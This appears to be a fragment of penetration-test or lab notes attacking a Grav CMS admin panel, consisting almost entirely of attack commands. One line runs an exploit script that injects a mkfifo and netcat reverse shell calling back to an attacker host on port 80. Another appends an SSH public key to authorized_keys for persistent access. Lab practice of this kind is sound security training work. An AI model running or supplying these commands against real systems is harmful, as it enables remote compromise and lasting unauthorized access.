...
![[Pasted image 20240823171949.png]]
...
```
python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.153 80 >/tmp/f' -t http://192.168.207.12/grav-admin
```
...
```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAZx4H33cGVBsKenyVMB5vEuE2CVK/0/xPnhxWfBWGj" >> authorized_keys
```
